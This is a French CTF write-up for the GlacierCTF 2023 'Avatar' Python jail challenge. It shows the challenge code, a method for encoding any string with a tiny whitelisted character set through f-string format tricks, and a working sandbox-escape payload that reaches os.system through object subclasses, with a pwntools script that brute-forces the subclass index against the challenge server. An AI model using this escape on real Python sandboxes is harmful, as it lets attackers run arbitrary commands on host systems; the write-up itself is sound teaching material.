---
title: "[GlacierCTF 2023 - misc] Avatar"
description: "Writeup by jsthope"
date: 2023-11-27
tags: [GlacierCTF 2023, misc, CTF, Writeup, French, Jail]
type: post
image: /images/glacierctf2023/Glacier_CTF_Logo.png
showTableOfContents: true
---
![HTB Cap Image](/images/glacierctf2023/Glacier_CTF_Logo.png)
# Introduction
Ce challenge a été complété en collaboration avec polyflag (polygl0ts, flagbot) durant le **GlacierCTF 2023**.

Le but de ce challenge est de s'échapper de cette prison pour récupérer le flag.

``chall.py``
```py
print("You get one chance to awaken from the ice prison.")
code = input("input: ").strip()


whitelist = """gctf{"*+*(=>:/)*+*"}""" # not the flag
if any([x not in whitelist for x in code]) or len(code) > 40000:
    
    print("Denied!")
    exit(0)

eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
```
# Première condition
Nous allons nous intéresser tout d'abord à la première condition:
```py
whitelist = """gctf{"*+*(=>:/)*+*"}"""
```
## Nombres
L'objectif ici est de pouvoir trouver une astuce pour pouvoir écrire à la fois tous les nombres ainsi que plus tard les caractères.

On trouve rapidement le moyen d'obtenir des nombres grâce à:
```py
digits = {
    0: '+("g"=="c")',
    1: '+("g"=="g")'}

for i in range(2, 150):
    digits[i] = digits[i-1] + digits[1] # True + True = 2...
```
Ce code s'optimisera plus tard avec:
```py
digits = {
    0: '+("">"")',
    1: '+(""=="")',
    }
```

Ainsi grâce au fstring (car le f est autorisé) on peut obtenir tous les nombres.
## Lettres
Nous trouvons ensuite un moyen d'obtenir les lettres grâce à une feature des fstrings:
```py
f"""{digits[97]:c}""" #retourne ici l'unicode correspondant
```

Nous écrivons ensuite ces deux fonctions afin de pouvoir construire notre payload obfusqué:
```py
def letter(letter_wanted):
    return '{'+digits[ord(letter_wanted)]+':c}'


def get_string(string_wanted):
    ret_str = ''
    for let in string_wanted:
        ret_str += letter(let)
    return 'f"""' + ret_str + '"""'
```

# Deuxième condition
Nous pouvons alors construire notre payload. 
Cependant, on se heurte vite à un problème: la deuxième condition.

Voici le payload que nous voulons utiliser:
```py
().__class__.__base__.__subclasses__()[107]().load_module('os').system('cat flag.txt')
```
Le problème est que ce payload obfusqué compte **67887** caractères...
Et la deuxième condition ne l'accepte donc pas...
```py
len(code) > 40000
```
## Optimisation
Notre méthode pour écrire les chiffres écrit ``6`` comme ``1+1+1+1+1+1`` 
Or il est beaucoup plus compacte de l'écrire comme ``(1+1+1)*(1+1)`` (surtout pour les grands nombres)

Ainsi, nous implémentons un check si le nombre est multiple de ``2`` ou ``3`` afin de gagner de la longueur (ce n'est pas le plus opti mais ça nous fait passer largement en dessous de 40'000)

```py
for i in range(2, 150):
    if i % 2 == 0:
        digits[i] = digits[i/2] + '*((""=="")+(""==""))'
    elif i % 3 == 0:
        digits[i] = digits[i/3] + '*((""=="")+(""=="")+(""==""))'
    else:
        digits[i] = "(" + digits[i-1] + digits[1] + ")"
```

Ces optimisations nous font passer notre payload à **13227** caractères !

Nous avons ensuite fait face à un grand problème: aucune réponse du serveur...
# Payload
Il est temps de s'intéresser maintenant au payload.
Le payload a été choisi en fonction de la restriction suivante:
```py
eval(eval(code, {'globals': {}, '__builtins__': {}}, {}), {'globals': {}, '__builtins__': {}}, {})
``` 
On voit ici qu'il n'y a ni de ``__builtins__``  ni de ``globals``
Donc le code qui sera évalué avec ``eval`` n'aura pas accès à toutes les fonctions natives de python (``print``, ``__import__``, etc ...) ([cf python.org](https://docs.python.org/3/library/functions.html))

Ça ne pose pas de problème en soit car des moyens de contourner ces restrictions existent ([cf hacktricks](https://book.hacktricks.xyz/generic-methodologies-and-resources/python/bypass-python-sandboxes#no-builtins))

Le payload est le suivant:
```py
().__class__.__base__.__subclasses__()[107]().load_module('os').system('cat flag.txt')
```
Il cherche à invoquer ``<class '_frozen_importlib.BuiltinImporter'>`` appelé à l'aide de  ``().__class__.__base__.__subclasses__()[107]`` afin d'utiliser à nouveau les Builtins.

Le problème est que dans la plupart des cas ``<class '_frozen_importlib.BuiltinImporter'>`` se trouve à l'index **107**.
Cependant, l'index peut dépendre de la version de python.

Il ne resta plus qu'à bruteforce l'index et de prier qu'une réponse positive nous revienne.

```py
for i in range(90,120):
    string_wanted = f"""().__class__.__base__.__subclasses__()[{i}]().load_module('os').system('cat flag.txt')"""
    obf = get_string(string_wanted)

    print(len(obf))
    #context.log_level = 'debug'

    p = remote("chall.glacierctf.com",13384)
    p.recv()
    p.sendline(obf)
    try: 
        print(p.recv())
        break
    except EOFError:
        pass
    p.close()

p.success(f"Correct Payload was: {string_wanted}")
```

![Avatar flag image](/images/glacierctf2023/flag.png)
